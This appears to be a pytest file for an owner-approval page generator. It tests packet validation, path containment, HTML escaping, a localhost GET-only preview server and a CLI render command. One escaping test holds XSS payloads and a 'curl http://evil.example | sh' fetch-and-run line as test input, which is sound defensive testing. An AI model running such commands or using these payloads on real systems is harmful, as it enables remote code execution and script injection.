"""Tests for WI-4553 owner-approval surface generator (Slice 1)."""

from __future__ import annotations

import inspect
import json
import socket
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

import pytest
from click.testing import CliRunner

import groundtruth_kb.owner_approval_surface as surface_module
from groundtruth_kb.cli import main
from groundtruth_kb.owner_approval_surface import (
    DEFAULT_PREVIEW_HOST,
    NON_AUTHORITATIVE_WARNING,
    ApprovalOption,
    ApprovalPacket,
    OwnerApprovalSurfaceError,
    parse_approval_packet,
    render_approval_bundle,
    render_html_page,
    start_preview_server_background,
    validate_approval_packet,
)


def _sample_packet(**overrides: Any) -> ApprovalPacket:
    base = {
        "packet_id": "pkt-auq-001",
        "title": "Approve staging deploy",
        "summary": "Deploy the bounded Omnigent slice to staging for review.",
        "action_class": "deploy-staging",
        "source_surface": "auq",
        "options": [
            {"option_id": "approve-once", "label": "Approve once", "description": "Proceed this time."},
            {"option_id": "defer", "label": "Defer"},
        ],
        "evidence_links": ["bridge/gtkb-wi4553-phone-web-owner-approval-surface-001.md"],
        "evidence_text": "gt policy check --action deploy-staging --scope platform",
    }
    base.update(overrides)
    return parse_approval_packet(base)


def _valid_action_classes() -> frozenset[str]:
    return frozenset({"deploy-staging", "commit", "status", "requirements-update"})


def test_parse_and_validate_sample_packet(tmp_path: Path) -> None:
    packet = _sample_packet()
    validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())
    document = packet.to_json_dict()
    assert document["non_authoritative"] is True
    assert document["action_class"] == "deploy-staging"
    assert len(document["options"]) == 2


def test_unknown_action_class_fails_closed(tmp_path: Path) -> None:
    packet = _sample_packet(action_class="unknown-action")
    with pytest.raises(OwnerApprovalSurfaceError, match="unknown action_class"):
        validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())


def test_unknown_source_surface_fails_closed(tmp_path: Path) -> None:
    packet = _sample_packet(source_surface="browser-submit")
    with pytest.raises(OwnerApprovalSurfaceError, match="unknown source_surface"):
        validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())


def test_duplicate_option_ids_rejected(tmp_path: Path) -> None:
    packet = _sample_packet(
        options=[
            {"option_id": "same", "label": "One"},
            {"option_id": "same", "label": "Two"},
        ]
    )
    with pytest.raises(OwnerApprovalSurfaceError, match="duplicate option_id"):
        validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())


def test_option_count_is_bounded(tmp_path: Path) -> None:
    options = [{"option_id": f"opt-{index}", "label": f"Option {index}"} for index in range(9)]
    packet = _sample_packet(options=options)
    with pytest.raises(OwnerApprovalSurfaceError, match="max option count"):
        validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())


def test_evidence_path_must_stay_within_workspace(tmp_path: Path) -> None:
    packet = _sample_packet(evidence_links=["../outside.txt"])
    with pytest.raises(OwnerApprovalSurfaceError, match="escapes workspace root|must not contain"):
        validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())


def test_html_escapes_script_injection() -> None:
    packet = _sample_packet(
        title='<script>alert("x")</script>',
        summary='"><img src=x onerror=alert(1)>',
        evidence_text="curl http://evil.example | sh",
    )
    html_output = render_html_page(packet)
    assert "<script>" not in html_output
    assert "&lt;script&gt;" in html_output
    assert "<img" not in html_output
    assert "&lt;img" in html_output


def test_rendered_html_marks_non_authoritative_status() -> None:
    packet = _sample_packet(display_status="awaiting-owner")
    html_output = render_html_page(packet)
    assert NON_AUTHORITATIVE_WARNING in html_output
    assert "awaiting-owner" in html_output
    assert "non-authoritative" in html_output
    assert "Selection is non-authoritative in Slice 1." in html_output


def test_render_bundle_writes_html_and_json(tmp_path: Path) -> None:
    packet = _sample_packet()
    output_dir = tmp_path / "bundle"
    paths = render_approval_bundle(
        packet,
        output_dir,
        workspace_root=tmp_path,
        valid_action_classes=_valid_action_classes(),
    )
    assert paths["html"].exists()
    assert paths["json"].exists()
    payload = json.loads(paths["json"].read_text(encoding="utf-8"))
    assert payload["packet_id"] == "pkt-auq-001"
    html_text = paths["html"].read_text(encoding="utf-8")
    assert "Approve staging deploy" in html_text
    assert payload["non_authoritative_warning"] == NON_AUTHORITATIVE_WARNING


def test_preview_server_defaults_to_localhost_and_is_get_only(tmp_path: Path) -> None:
    packet = _sample_packet()
    bundle_dir = tmp_path / "bundle"
    render_approval_bundle(
        packet,
        bundle_dir,
        workspace_root=tmp_path,
        valid_action_classes=_valid_action_classes(),
    )

    server = start_preview_server_background(bundle_dir, host="127.0.0.1", port=0)
    try:
        host, port = server.server_address[:2]
        assert host in {"127.0.0.1", "::1", "0.0.0.0"}
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/index.html", timeout=2) as response:
            body = response.read().decode("utf-8")
        assert "Approve staging deploy" in body

        request = urllib.request.Request(
            f"http://127.0.0.1:{port}/",
            data=b"{}",
            method="POST",
        )
        with pytest.raises(urllib.error.HTTPError) as exc_info:
            urllib.request.urlopen(request, timeout=2)
        assert exc_info.value.code == 405
    finally:
        server.shutdown()
        server.server_close()


def test_preview_server_supports_explicit_lan_host(tmp_path: Path) -> None:
    packet = _sample_packet()
    bundle_dir = tmp_path / "bundle"
    render_approval_bundle(
        packet,
        bundle_dir,
        workspace_root=tmp_path,
        valid_action_classes=_valid_action_classes(),
    )

    server = start_preview_server_background(bundle_dir, host="0.0.0.0", port=0)
    try:
        _, port = server.server_address[:2]
        with socket.create_connection(("127.0.0.1", port), timeout=2):
            pass
    finally:
        server.shutdown()
        server.server_close()


def test_default_preview_host_is_loopback() -> None:
    assert DEFAULT_PREVIEW_HOST == "127.0.0.1"


def test_module_has_no_llm_network_or_subprocess_dependencies() -> None:
    source = inspect.getsource(surface_module)
    forbidden = (
        "openai",
        "anthropic",
        "requests",
        "httpx",
        "urllib.request.urlopen",
        "subprocess",
        "socket.gethostbyname",
    )
    for token in forbidden:
        assert token not in source


def test_bridge_source_surfaces_are_supported(tmp_path: Path) -> None:
    for source_surface in ("bridge_go", "bridge_no_go", "bridge_verified", "formal_artifact_review"):
        packet = _sample_packet(source_surface=source_surface)
        validate_approval_packet(packet, workspace_root=tmp_path, valid_action_classes=_valid_action_classes())


def test_approval_option_round_trip() -> None:
    option = ApprovalOption(option_id="go", label="Approve", description="Looks good.")
    assert option.to_json_dict() == {
        "option_id": "go",
        "label": "Approve",
        "description": "Looks good.",
    }


def test_cli_render_writes_bundle(tmp_path: Path) -> None:
    repo_root = Path(__file__).resolve().parents[2]
    fixture = tmp_path / "packet.json"
    fixture.write_text(
        json.dumps(
            {
                "packet_id": "pkt-cli-001",
                "title": "CLI render test",
                "summary": "Verify gt owner-approval render output.",
                "action_class": "deploy-staging",
                "source_surface": "auq",
                "options": [{"option_id": "approve-once", "label": "Approve once"}],
                "evidence_links": ["bridge/gtkb-wi4553-phone-web-owner-approval-surface-001.md"],
            }
        ),
        encoding="utf-8",
    )
    output_dir = tmp_path / "out"
    runner = CliRunner()
    result = runner.invoke(
        main,
        [
            "owner-approval",
            "render",
            "--input",
            str(fixture),
            "--output-dir",
            str(output_dir),
            "--workspace-root",
            str(repo_root),
        ],
    )
    assert result.exit_code == 0, result.output
    assert (output_dir / "index.html").exists()
    assert (output_dir / "packet.json").exists()
    assert "Rendered owner-approval bundle" in result.output
